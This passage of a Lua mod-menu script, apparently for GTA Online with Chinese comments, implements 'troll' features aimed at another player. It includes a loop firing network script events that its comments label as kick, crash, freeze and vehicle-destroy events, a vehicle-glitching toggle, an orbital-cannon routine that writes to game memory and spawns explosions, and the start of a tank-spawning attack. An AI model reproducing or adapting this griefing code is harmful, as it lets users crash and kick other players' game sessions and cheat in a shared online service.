	for i = -1, seat_count - 2, 1 do
		if VEHICLE.IS_VEHICLE_SEAT_FREE(veh, i, true) then
			return i
		end
	end
end
function spawn_object(hash, location, is_networked)-- 生成物体
    location = location or {x = 0, y = 0, z = 0}
    is_networked = is_networked ~= false -- 默认为 true
    if not request_model(hash) then
        util.toast("无法加载模型 " .. hash)
        return 0
    end
    local object = OBJECT.CREATE_OBJECT(hash, location.x, location.y, location.z, is_networked, false, false)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
    return object
end
updatetroll:toggle("故障车辆", {}, "", function(vehF)
    nF = vehF
    if nF then
        FreeSeatGlitchVehicle = get_free_seat(PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    end
    while nF do
        if PED.IS_PED_SITTING_IN_ANY_VEHICLE(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)) then
            if FreeSeatGlitchVehicle ~= -2 then
                if not ENTITY.DOES_ENTITY_EXIST(PedGlitchVehicle) then
                    local pos1 <const> = players.get_position(pid)
                    PedGlitchVehicle = CreatePed(-1, util.joaat("CSB_Avery"), v3(pos1.x, pos1.y, pos1.z), 0)
                    VehGlitchVehicle = spawn_object(util.joaat("v_ind_cf_chickfeed"), v3(pos1.x, pos1.y, pos1.z), true)
                    ENTITY.SET_ENTITY_VISIBLE(PedGlitchVehicle, false)
                    ENTITY.SET_ENTITY_VISIBLE(VehGlitchVehicle, false)
                end
                PED.SET_PED_INTO_VEHICLE(PedGlitchVehicle, PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)), FreeSeatGlitchVehicle)
                ENTITY.ATTACH_ENTITY_TO_ENTITY(VehGlitchVehicle, PedGlitchVehicle, 0, 0, 0, 0, math.random(0, 360), math.random(0, 360), math.random(0, 360), false, true, false, false, 0, true, 0)
            else
                gtoast("车上没有空闲座位")
                nF = false
            end
        else
            gtoast(PLAYER.GET_PLAYER_NAME(pid) .. " 不在载具中")
            nF = false
        end
        wait()
    end
    if not nF then
        if ENTITY.DOES_ENTITY_EXIST(PedGlitchVehicle) and ENTITY.DOES_ENTITY_EXIST(VehGlitchVehicle) then
            entities.delete_by_handle(PedGlitchVehicle)
            entities.delete_by_handle(VehGlitchVehicle)
        end
    end
end)
GTAC(updatetroll, "集成事件恶搞", {}, "很可能会被拦截", function()
    for i = 0, 10 do
        util.trigger_script_event(1 << pid ,{2098360921, i})
    	util.trigger_script_event(1 << pid ,{-1604421397, i}) -- 踢出事件S0
        util.trigger_script_event(1 << pid ,{-901348601, i}) -- 踢出事件S1
        util.trigger_script_event(1 << pid ,{1103127469, i}) -- 崩溃事件S0
        util.trigger_script_event(1 << pid ,{323285304, i}) -- 崩溃事件S2
        util.trigger_script_event(1 << pid ,{800157557, i}) -- 作弊者事件S3
        util.trigger_script_event(1 << pid ,{109434679, i}) -- 作弊者事件S5
        util.trigger_script_event(1 << pid ,{-1906536929, i}) -- 产业突袭
        util.trigger_script_event(1 << pid ,{-366707054, i}) -- 发送差事
        util.trigger_script_event(1 << pid ,{259469385, i}) -- 发送差事
        util.trigger_script_event(1 << pid ,{-11681548, i}) -- 踢出CEO
        util.trigger_script_event(1 << pid ,{-33050122, i}) -- 通知
        util.trigger_script_event(1 << pid ,{1655503526, i}) -- 摧毁个人载具
        util.trigger_script_event(1 << pid ,{-1951335381, i}) -- 发送到动画
        util.trigger_script_event(1 << pid ,{1669592503, i}) -- 冻结
        util.trigger_script_event(1 << pid ,{996099702, i}) -- 公寓邀请(非强制)
        util.trigger_script_event(1 << pid ,{-503325966, i}) -- 踢出载具
        util.trigger_script_event(1 << pid ,{-1496371358, i}) -- 踢出室内
    end
end)
GTTG(updatetroll, "天基炮玩家", {}, "WASD可移动镜头", function(tjp)
    gun = tjp
    if not is_loading_into_session() and not ENTITY.IS_ENTITY_DEAD(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)) then
        memory.write_int(memory.script_global(2689235 + 1 + (pid * 453) + 416),
            memory.read_int(memory.script_global(2689235 + 1 + (pid * 453) + 416) | 1 << 0))
        AUDIO.START_AUDIO_SCENE("dlc_xm_orbital_cannon_camera_active_scene")
        CAM.DO_SCREEN_FADE_OUT(500)
        wait(500)
        local orbital_cannon_cam_cam = CAM.CREATE_CAM_WITH_PARAMS("DEFAULT_SCRIPTED_CAMERA",
            players.get_position(pid).x, players.get_position(pid).y, players.get_position(pid).z + 30, -90, 0, 0, 70.0,
            false, false)
        local orbital_cannon_blip = HUD.ADD_BLIP_FOR_COORD(0, 0, 0)
        HUD.SET_BLIP_SPRITE(orbital_cannon_blip, 390)
        CAM.SET_CAM_ACTIVE(orbital_cannon_cam_cam, true)
        CAM.RENDER_SCRIPT_CAMS(true, false, 0, true, true, 0)
        CAM.DO_SCREEN_FADE_IN(500)
        wait(500)
        while gun do
            if is_loading_into_session() or ENTITY.IS_ENTITY_DEAD(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)) then
                gun = false
            end
            for pid = 0, 31 do
                if players.exists(pid) then
                    if players.is_in_interior(pid) == 0 and
                        not NETWORK.IS_ENTITY_GHOSTED_TO_LOCAL_PLAYER(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)) and
                        not is_player_passive(pid) then
                        GRAPHICS.REQUEST_STREAMED_TEXTURE_DICT("helicopterhud", false)
                        if GRAPHICS.HAS_STREAMED_TEXTURE_DICT_LOADED("helicopterhud") then
                            local sizeY = 0.013 * GRAPHICS.GET_ASPECT_RATIO(false)
                            local size = (((1 - (CAM.GET_CAM_FOV(orbital_cannon_cam_cam) / 110.0)) * 1.0 +
                                             (CAM.GET_CAM_FOV(orbital_cannon_cam_cam) / 110.0) * 0.5) * 0.03)
                            GRAPHICS.SET_DRAW_ORIGIN(players.get_position(pid).x, players.get_position(pid).y,
                                players.get_position(pid).z, 0)
                            GRAPHICS.DRAW_SPRITE("helicopterhud", "hud_corner", -size * 0.5, -size, 0.013, sizeY, 0.0,
                                190, 255, 190, 255, true, 0)
                            GRAPHICS.DRAW_SPRITE("helicopterhud", "hud_corner", size * 0.5, -size, 0.013, sizeY, 90.0,
                                190, 255, 190, 255, true, 0)
                            GRAPHICS.DRAW_SPRITE("helicopterhud", "hud_corner", -size * 0.5, size, 0.013, sizeY, 270.,
                                190, 255, 190, 255, true, 0)
                            GRAPHICS.DRAW_SPRITE("helicopterhud", "hud_corner", size * 0.5, size, 0.013, sizeY, 180.,
                                190, 255, 190, 255, true, 0)
                            GRAPHICS.CLEAR_DRAW_ORIGIN()
                        end
                    end
                end
            end
            HUD.SET_BLIP_COORDS(orbital_cannon_blip, CAM.GET_CAM_COORD(orbital_cannon_cam_cam).x,
                CAM.GET_CAM_COORD(orbital_cannon_cam_cam).y, CAM.GET_CAM_COORD(orbital_cannon_cam_cam).z)
            for i = 6, 9 do
                HUD.HIDE_HUD_COMPONENT_THIS_FRAME(i)
            end
            PAD.DISABLE_ALL_CONTROL_ACTIONS(0)
            for i = 0, 6 do
                PAD.ENABLE_CONTROL_ACTION(0, i, true)
            end
            for i = 199, 202 do
                PAD.ENABLE_CONTROL_ACTION(0, i, true)
            end
            for i = 14, 15 do
                PAD.ENABLE_CONTROL_ACTION(0, i, true)
            end
            PAD.ENABLE_CONTROL_ACTION(0, 177, true)
            PAD.ENABLE_CONTROL_ACTION(0, 237, true)
            PAD.ENABLE_CONTROL_ACTION(0, 20, true)
            PAD.ENABLE_CONTROL_ACTION(0, 246, true)
            PAD.ENABLE_CONTROL_ACTION(0, 245, true)
            GRAPHICS.CASCADE_SHADOWS_SET_AIRCRAFT_MODE(true)
            HUD.SET_MINIMAP_IN_SPECTATOR_MODE(true, PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
            STREAMING.REQUEST_ADDITIONAL_COLLISION_AT_COORD(players.get_position(pid).x, players.get_position(pid).y,
                players.get_position(pid).z)
            STREAMING.SET_FOCUS_POS_AND_VEL(CAM.GET_CAM_COORD(orbital_cannon_cam_cam).x,
                CAM.GET_CAM_COORD(orbital_cannon_cam_cam).y, CAM.GET_CAM_COORD(orbital_cannon_cam_cam).z, 0.0, 0.0, 0.0)
            HUD.LOCK_MINIMAP_POSITION(CAM.GET_CAM_COORD(orbital_cannon_cam_cam).x,
                CAM.GET_CAM_COORD(orbital_cannon_cam_cam).y)
            NETWORK.NETWORK_SET_IN_FREE_CAM_MODE(true)
            local orbital_cannon_cam = GRAPHICS.REQUEST_SCALEFORM_MOVIE("ORBITAL_CANNON_CAM")
            if GRAPHICS.HAS_SCALEFORM_MOVIE_LOADED(orbital_cannon_cam) then
                GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(orbital_cannon_cam, "SET_ZOOM_LEVEL")
                GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(0.0)
                GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
                GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(orbital_cannon_cam, "SET_STATE")
                GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(3)
                GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
                GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(orbital_cannon_cam, "SET_CHARGING_LEVEL")
                GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(1.0)
                GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
                GRAPHICS.DRAW_SCALEFORM_MOVIE_FULLSCREEN(orbital_cannon_cam, 255, 255, 255, 255, 0)
            end
            local direction = v3(0, 0, 0)
            local speed = 0.5
            if PAD.IS_DISABLED_CONTROL_PRESSED(0, 22) then
                speed = speed * 4
            end
            if PAD.IS_DISABLED_CONTROL_PRESSED(0, 32) then
                direction.y = speed
            end
            if PAD.IS_DISABLED_CONTROL_PRESSED(0, 35) then
                direction.x = speed
            end
            if PAD.IS_DISABLED_CONTROL_PRESSED(0, 34) then
                direction.x = -speed
            end
            if PAD.IS_DISABLED_CONTROL_PRESSED(0, 33) then
                direction.y = -speed
            end
            if direction ~= v3(0, 0, 0) then
                CAM.SET_CAM_COORD(orbital_cannon_cam_cam, CAM.GET_CAM_COORD(orbital_cannon_cam_cam).x + direction.x,
                    CAM.GET_CAM_COORD(orbital_cannon_cam_cam).y + direction.y,
                    CAM.GET_CAM_COORD(orbital_cannon_cam_cam).z + direction.z)
            end
            local success, groundZ = util.get_ground_z(CAM.GET_CAM_COORD(orbital_cannon_cam_cam).x,
                CAM.GET_CAM_COORD(orbital_cannon_cam_cam).y, CAM.GET_CAM_COORD(orbital_cannon_cam_cam).z)
            if PAD.IS_DISABLED_CONTROL_PRESSED(0, 15) and
                not (success and (CAM.GET_CAM_COORD(orbital_cannon_cam_cam).z - 6 - groundZ) < 25.0) then
                CAM.SET_CAM_COORD(orbital_cannon_cam_cam, CAM.GET_CAM_COORD(orbital_cannon_cam_cam).x,
                    CAM.GET_CAM_COORD(orbital_cannon_cam_cam).y, CAM.GET_CAM_COORD(orbital_cannon_cam_cam).z - 6)
            elseif PAD.IS_DISABLED_CONTROL_PRESSED(0, 14) then
                CAM.SET_CAM_COORD(orbital_cannon_cam_cam, CAM.GET_CAM_COORD(orbital_cannon_cam_cam).x,
                    CAM.GET_CAM_COORD(orbital_cannon_cam_cam).y, CAM.GET_CAM_COORD(orbital_cannon_cam_cam).z + 6)
            end
            if success and (CAM.GET_CAM_COORD(orbital_cannon_cam_cam).z - groundZ) < 25.0 then
                CAM.SET_CAM_COORD(orbital_cannon_cam_cam, CAM.GET_CAM_COORD(orbital_cannon_cam_cam).x, CAM.GET_CAM_COORD(orbital_cannon_cam_cam).y, groundZ + 26)
            end
            if not HUD.IS_PAUSE_MENU_ACTIVE() then
                if PAD.IS_DISABLED_CONTROL_JUST_PRESSED(0, 24) then
                    local timer = util.current_time_millis() + 3000
                    while timer > util.current_time_millis() and PAD.IS_DISABLED_CONTROL_PRESSED(0, 24) and
                        not HUD.IS_PAUSE_MENU_ACTIVE() do
                        AUDIO.STOP_AUDIO_SCENE("dlc_xm_orbital_cannon_camera_active_scene")
                        for pid = 0, 31 do
                            if players.exists(pid) then
                                if players.is_in_interior(pid) == 0 and
                                    not NETWORK.IS_ENTITY_GHOSTED_TO_LOCAL_PLAYER(
                                        PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)) and not is_player_passive(pid) then
                                    natives.REQUEST_STREAMED_TEXTURE_DICT("helicopterhud", false)
                                    if GRAPHICS.HAS_STREAMED_TEXTURE_DICT_LOADED("helicopterhud") then
                                        local sizeY = 0.013 * GRAPHICS.GET_ASPECT_RATIO(false)
                                        local size = (((1 - (CAM.GET_CAM_FOV(orbital_cannon_cam_cam) / 110.0)) * 1.0 +
                                                         (CAM.GET_CAM_FOV(orbital_cannon_cam_cam) / 110.0) * 0.5) * 0.03)
                                        GRAPHICS.SET_DRAW_ORIGIN(players.get_position(pid).x,
                                            players.get_position(pid).y, players.get_position(pid).z, 0)
                                        GRAPHICS.DRAW_SPRITE("helicopterhud", "hud_corner", -size * 0.5, -size, 0.013,
                                            sizeY, 0.0, 190, 255, 190, 255, true, 0)
                                        GRAPHICS.DRAW_SPRITE("helicopterhud", "hud_corner", size * 0.5, -size, 0.013,
                                            sizeY, 90.0, 190, 255, 190, 255, true, 0)
                                        GRAPHICS.DRAW_SPRITE("helicopterhud", "hud_corner", -size * 0.5, size, 0.013,
                                            sizeY, 270., 190, 255, 190, 255, true, 0)
                                        GRAPHICS.DRAW_SPRITE("helicopterhud", "hud_corner", size * 0.5, size, 0.013,
                                            sizeY, 180., 190, 255, 190, 255, true, 0)
                                        GRAPHICS.CLEAR_DRAW_ORIGIN()
                                    end
                                end
                            end
                        end
                        HUD.SET_BLIP_COORDS(orbital_cannon_blip, CAM.GET_CAM_COORD(orbital_cannon_cam_cam).x,
                            CAM.GET_CAM_COORD(orbital_cannon_cam_cam).y, CAM.GET_CAM_COORD(orbital_cannon_cam_cam).z)
                        for i = 6, 9 do
                            HUD.HIDE_HUD_COMPONENT_THIS_FRAME(i)
                        end
                        PAD.DISABLE_ALL_CONTROL_ACTIONS(0)
                        for i = 0, 6 do
                            PAD.ENABLE_CONTROL_ACTION(0, i, true)
                        end
                        for i = 199, 202 do
                            PAD.ENABLE_CONTROL_ACTION(0, i, true)
                        end
                        for i = 14, 15 do
                            PAD.ENABLE_CONTROL_ACTION(0, i, true)
                        end
                        PAD.ENABLE_CONTROL_ACTION(0, 177, true)
                        PAD.ENABLE_CONTROL_ACTION(0, 237, true)
                        PAD.ENABLE_CONTROL_ACTION(0, 20, true)
                        PAD.ENABLE_CONTROL_ACTION(0, 246, true)
                        PAD.ENABLE_CONTROL_ACTION(0, 245, true)
                        GRAPHICS.CASCADE_SHADOWS_SET_AIRCRAFT_MODE(true)
                        HUD.SET_MINIMAP_IN_SPECTATOR_MODE(true, players.user_ped())
                        STREAMING.REQUEST_ADDITIONAL_COLLISION_AT_COORD(players.get_position(players.user()).x,
                            players.get_position(players.user()).y, players.get_position(players.user()).z)
                        STREAMING.SET_FOCUS_POS_AND_VEL(CAM.GET_CAM_COORD(orbital_cannon_cam_cam).x,
                            CAM.GET_CAM_COORD(orbital_cannon_cam_cam).y, CAM.GET_CAM_COORD(orbital_cannon_cam_cam).z,
                            0.0, 0.0, 0.0)
                        HUD.LOCK_MINIMAP_POSITION(CAM.GET_CAM_COORD(orbital_cannon_cam_cam).x,
                            CAM.GET_CAM_COORD(orbital_cannon_cam_cam).y)
                        NETWORK.NETWORK_SET_IN_FREE_CAM_MODE(true)
                        local orbital_cannon_cam = GRAPHICS.REQUEST_SCALEFORM_MOVIE("ORBITAL_CANNON_CAM")
                        if GRAPHICS.HAS_SCALEFORM_MOVIE_LOADED(orbital_cannon_cam) then
                            GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(orbital_cannon_cam, "SET_ZOOM_LEVEL")
                            GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(0.0)
                            GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
                            GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(orbital_cannon_cam, "SET_STATE")
                            GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(3)
                            GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
                            if timer - util.current_time_millis() <= 1000 then
                                GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(orbital_cannon_cam, "SET_COUNTDOWN")
                                GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(1)
                                GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
                            elseif timer - util.current_time_millis() <= 2000 then
                                GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(orbital_cannon_cam, "SET_COUNTDOWN")
                                GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(2)
                                GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
                            elseif timer - util.current_time_millis() <= 3000 then
                                GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(orbital_cannon_cam, "SET_COUNTDOWN")
                                GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(3)
                                GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
                            end
                            GRAPHICS.DRAW_SCALEFORM_MOVIE_FULLSCREEN(orbital_cannon_cam, 255, 255, 255, 255, 0)
                        end
                        local direction = v3(0, 0, 0)
                        local speed = 0.5
                        if PAD.IS_DISABLED_CONTROL_PRESSED(0, 22) then
                            speed = speed * 4
                        end
                        if PAD.IS_DISABLED_CONTROL_PRESSED(0, 32) then
                            direction.y = speed
                        end
                        if PAD.IS_DISABLED_CONTROL_PRESSED(0, 35) then
                            direction.x = speed
                        end
                        if PAD.IS_DISABLED_CONTROL_PRESSED(0, 34) then
                            direction.x = -speed
                        end
                        if PAD.IS_DISABLED_CONTROL_PRESSED(0, 33) then
                            direction.y = -speed
                        end
                        if direction ~= v3(0, 0, 0) then
                            CAM.SET_CAM_COORD(orbital_cannon_cam_cam,
                                CAM.GET_CAM_COORD(orbital_cannon_cam_cam).x + direction.x,
                                CAM.GET_CAM_COORD(orbital_cannon_cam_cam).y + direction.y,
                                CAM.GET_CAM_COORD(orbital_cannon_cam_cam).z + direction.z)
                        end
                        local success, groundZ = util.get_ground_z(CAM.GET_CAM_COORD(orbital_cannon_cam_cam).x,
                            CAM.GET_CAM_COORD(orbital_cannon_cam_cam).y, CAM.GET_CAM_COORD(orbital_cannon_cam_cam).z)
                        if PAD.IS_DISABLED_CONTROL_PRESSED(0, 15) and
                            not (success and (CAM.GET_CAM_COORD(orbital_cannon_cam_cam).z - 6 - groundZ) < 25.0) then
                            CAM.SET_CAM_COORD(orbital_cannon_cam_cam, CAM.GET_CAM_COORD(orbital_cannon_cam_cam).x,
                                CAM.GET_CAM_COORD(orbital_cannon_cam_cam).y,
                                CAM.GET_CAM_COORD(orbital_cannon_cam_cam).z + 6)
                        elseif PAD.IS_DISABLED_CONTROL_PRESSED(0, 14) then
                            CAM.SET_CAM_COORD(orbital_cannon_cam_cam, CAM.GET_CAM_COORD(orbital_cannon_cam_cam).x,
                                CAM.GET_CAM_COORD(orbital_cannon_cam_cam).y,
                                CAM.GET_CAM_COORD(orbital_cannon_cam_cam).z + 6)
                        end
                        if success and (CAM.GET_CAM_COORD(orbital_cannon_cam_cam).z - groundZ) < 25.0 then
                            CAM.SET_CAM_COORD(orbital_cannon_cam_cam, v3(CAM.GET_CAM_COORD(orbital_cannon_cam_cam).x,
                                CAM.GET_CAM_COORD(orbital_cannon_cam_cam).y, groundZ + 26))
                        end
                        wait(0)
                    end
                    if timer <= util.current_time_millis() then
                        local raycastResult = get_raycast_result(1000.0)
                        local pos = raycastResult.endCoords
                        local rot = raycastResult.surfaceNormal:toRot()
                        rot.x = rot.x - 90.0
                        request_ptfx_asset("scr_xm_orbital")
                        GRAPHICS.USE_PARTICLE_FX_ASSET("scr_xm_orbital")
                        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("scr_xm_orbital_blast", pos.x, pos.y,
                            pos.z, rot.x, rot.y, rot.z, 1.0, false, false, false, true)
                        FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0, false)
                        CAM.SHAKE_CAM(orbital_cannon_cam_cam, "GAMEPLAY_EXPLOSION_SHAKE", 1.5)
                        local timer = util.current_time_millis() + 3000
                        while timer > util.current_time_millis() do
                            AUDIO.STOP_AUDIO_SCENE("dlc_xm_orbital_cannon_camera_active_scene")
                            for pid = 0, 31 do
                                if players.exists(pid) then
                                    if players.is_in_interior(pid) == 0 and
                                        not NETWORK.IS_ENTITY_GHOSTED_TO_LOCAL_PLAYER(
                                            PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)) and not is_player_passive(pid) then
                                        GRAPHICS.REQUEST_STREAMED_TEXTURE_DICT("helicopterhud", false)
                                        if GRAPHICS.HAS_STREAMED_TEXTURE_DICT_LOADED("helicopterhud") then
                                            local sizeY = 0.013 * GRAPHICS.GET_ASPECT_RATIO(false)
                                            local size =
                                                (((1 - (CAM.GET_CAM_FOV(orbital_cannon_cam_cam) / 110.0)) * 1.0 +
                                                    (CAM.GET_CAM_FOV(orbital_cannon_cam_cam) / 110.0) * 0.5) * 0.03)
                                            GRAPHICS.SET_DRAW_ORIGIN(players.get_position(pid), 0)
                                            GRAPHICS.DRAW_SPRITE("helicopterhud", "hud_corner", -size * 0.5, -size,
                                                0.013, sizeY, 0.0, 190, 255, 190, 255, true, 0)
                                            GRAPHICS.DRAW_SPRITE("helicopterhud", "hud_corner", size * 0.5, -size,
                                                0.013, sizeY, 90.0, 190, 255, 190, 255, true, 0)
                                            GRAPHICS.DRAW_SPRITE("helicopterhud", "hud_corner", -size * 0.5, size,
                                                0.013, sizeY, 270., 190, 255, 190, 255, true, 0)
                                            GRAPHICS.DRAW_SPRITE("helicopterhud", "hud_corner", size * 0.5, size, 0.013,
                                                sizeY, 180., 190, 255, 190, 255, true, 0)
                                            GRAPHICS.CLEAR_DRAW_ORIGIN()
                                        end
                                    end
                                end
                            end
                            HUD.SET_BLIP_COORDS(orbital_cannon_blip, CAM.GET_CAM_COORD(orbital_cannon_cam_cam).x,
                                CAM.GET_CAM_COORD(orbital_cannon_cam_cam).y, CAM.GET_CAM_COORD(orbital_cannon_cam_cam).z)
                            for i = 6, 9 do
                                HUD.HIDE_HUD_COMPONENT_THIS_FRAME(i)
                            end
                            PAD.DISABLE_ALL_CONTROL_ACTIONS(0)
                            for i = 0, 6 do
                                PAD.ENABLE_CONTROL_ACTION(0, i, true)
                            end
                            for i = 199, 202 do
                                PAD.ENABLE_CONTROL_ACTION(0, i, true)
                            end
                            for i = 14, 15 do
                                PAD.ENABLE_CONTROL_ACTION(0, i, true)
                            end
                            PAD.ENABLE_CONTROL_ACTION(0, 177, true)
                            PAD.ENABLE_CONTROL_ACTION(0, 237, true)
                            PAD.ENABLE_CONTROL_ACTION(0, 20, true)
                            PAD.ENABLE_CONTROL_ACTION(0, 246, true)
                            PAD.ENABLE_CONTROL_ACTION(0, 245, true)
                            GRAPHICS.CASCADE_SHADOWS_SET_AIRCRAFT_MODE(true)
                            HUD.SET_MINIMAP_IN_SPECTATOR_MODE(true, players.user_ped())
                            STREAMING.REQUEST_ADDITIONAL_COLLISION_AT_COORD(players.get_position(players.user()).x,
                                players.get_position(players.user()).y, players.get_position(players.user()).z)
                            STREAMING.SET_FOCUS_POS_AND_VEL(CAM.GET_CAM_COORD(orbital_cannon_cam_cam).x,
                                CAM.GET_CAM_COORD(orbital_cannon_cam_cam).y,
                                CAM.GET_CAM_COORD(orbital_cannon_cam_cam).z, 0.0, 0.0, 0.0)
                            HUD.LOCK_MINIMAP_POSITION(CAM.GET_CAM_COORD(orbital_cannon_cam_cam).x,
                                CAM.GET_CAM_COORD(orbital_cannon_cam_cam).y)
                            NETWORK.NETWORK_SET_IN_FREE_CAM_MODE(true)
                            local orbital_cannon_cam = GRAPHICS.REQUEST_SCALEFORM_MOVIE("ORBITAL_CANNON_CAM")
                            if GRAPHICS.HAS_SCALEFORM_MOVIE_LOADED(orbital_cannon_cam) then
                                GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(orbital_cannon_cam, "SET_ZOOM_LEVEL")
                                GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(0.0)
                                GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
                                GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(orbital_cannon_cam, "SET_STATE")
                                GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(3)
                                GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
                                GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(orbital_cannon_cam, "SET_CHARGING_LEVEL")
                                GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(tonumber(1.0 -
                                                                                             ((timer -
                                                                                                 util.current_time_millis()) /
                                                                                                 3000)))
                                GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
                                GRAPHICS.DRAW_SCALEFORM_MOVIE_FULLSCREEN(orbital_cannon_cam, 255, 255, 255, 255, 0)
                            end
                            local direction = v3(0, 0, 0)
                            local speed = 0.5
                            if PAD.IS_DISABLED_CONTROL_PRESSED(0, 22) then
                                speed = speed * 4
                            end
                            if PAD.IS_DISABLED_CONTROL_PRESSED(0, 32) then
                                direction.y = speed
                            end
                            if PAD.IS_DISABLED_CONTROL_PRESSED(0, 35) then
                                direction.x = speed
                            end
                            if PAD.IS_DISABLED_CONTROL_PRESSED(0, 34) then
                                direction.x = -speed
                            end
                            if PAD.IS_DISABLED_CONTROL_PRESSED(0, 33) then
                                direction.y = -speed
                            end
                            if direction ~= v3(0, 0, 0) then
                                CAM.SET_CAM_COORD(orbital_cannon_cam_cam,
                                    CAM.GET_CAM_COORD(orbital_cannon_cam_cam).x + direction.x,
                                    CAM.GET_CAM_COORD(orbital_cannon_cam_cam).y + direction.y,
                                    CAM.GET_CAM_COORD(orbital_cannon_cam_cam).z + direction.z)
                            end
                            local success, groundZ = util.get_ground_z(CAM.GET_CAM_COORD(orbital_cannon_cam_cam).x,
                                CAM.GET_CAM_COORD(orbital_cannon_cam_cam).y, CAM.GET_CAM_COORD(orbital_cannon_cam_cam).z)
                            if PAD.IS_DISABLED_CONTROL_PRESSED(0, 15) and
                                not (success and (CAM.GET_CAM_COORD(orbital_cannon_cam_cam).z - 6 - groundZ) < 25.0) then
                                CAM.SET_CAM_COORD(orbital_cannon_cam_cam, CAM.GET_CAM_COORD(orbital_cannon_cam_cam).x,
                                    CAM.GET_CAM_COORD(orbital_cannon_cam_cam).y,
                                    CAM.GET_CAM_COORD(orbital_cannon_cam_cam).z - 6)
                            elseif PAD.IS_DISABLED_CONTROL_PRESSED(0, 14) then
                                CAM.SET_CAM_COORD(orbital_cannon_cam_cam, CAM.GET_CAM_COORD(orbital_cannon_cam_cam).x,
                                    CAM.GET_CAM_COORD(orbital_cannon_cam_cam).y,
                                    CAM.GET_CAM_COORD(orbital_cannon_cam_cam).z + 6)
                            end
                            if success and (CAM.GET_CAM_COORD(orbital_cannon_cam_cam).z - groundZ) < 25.0 then
                                CAM.SET_CAM_COORD(orbital_cannon_cam_cam, v3(
                                    CAM.GET_CAM_COORD(orbital_cannon_cam_cam).x,
                                    CAM.GET_CAM_COORD(orbital_cannon_cam_cam).y, groundZ + 26))
                            end
                            wait(0)
                        end
                    end
                    AUDIO.START_AUDIO_SCENE("dlc_xm_orbital_cannon_camera_active_scene")
                end
            end
            wait(0)
        end
        CAM.DO_SCREEN_FADE_OUT(500)
        wait(500)
        if orbital_cannon_cam_cam then
            CAM.SET_CAM_ACTIVE(orbital_cannon_cam_cam, false)
            CAM.RENDER_SCRIPT_CAMS(false, false, 0, false, false, false)
            CAM.DESTROY_CAM(orbital_cannon_cam_cam, false)
        end
        if orbital_cannon_blip then
            util.remove_blip(orbital_cannon_blip)
        end
        GRAPHICS.CASCADE_SHADOWS_SET_AIRCRAFT_MODE(false)
        HUD.SET_MINIMAP_IN_SPECTATOR_MODE(false, players.user_ped())
        AUDIO.STOP_AUDIO_SCENE("dlc_xm_orbital_cannon_camera_active_scene")
        NETWORK.NETWORK_SET_IN_FREE_CAM_MODE(false)
        HUD.UNLOCK_MINIMAP_POSITION()
        PAD.ENABLE_ALL_CONTROL_ACTIONS(0)
        STREAMING.CLEAR_FOCUS()
        CAM.DO_SCREEN_FADE_IN(500)
        wait(500)
        memory.write_int(memory.script_global(2689235 + 1 + (players.user() * 453) + 416),
            memory.read_int(memory.script_global(2689235 + 1 + (players.user() * 453) + 416) & ~1 << 0))
    else
        gun = false
    end
end)
GTAC(updatetroll, "可汉贾利攻击", {}, "跟随目标", function()
    local veh_hash = util.joaat("khanjali")
    local ped_hash = util.joaat('a_m_o_tramp_01')
    request_model(veh_hash, 2000)
    request_model(ped_hash, 2000)
    local tar_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local offset = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(tar_ped, 0.0, -10.0, 0.0)
    local success, new_z
    success = false
    local tries = 0
    while not success do
        if tries > 10 then
            break
        end
        tries = tries + 1
        success, new_z = util.get_ground_z(offset.x, offset.y, offset.z)
        if success then 
            offset.z = new_z
            break
        end
        wait()
    end
    turret = spawn_vehicle(veh_hash, offset, math.random(270))
    VEHICLE.SET_VEHICLE_MOD(turret, 10, math.random(-1, 0))
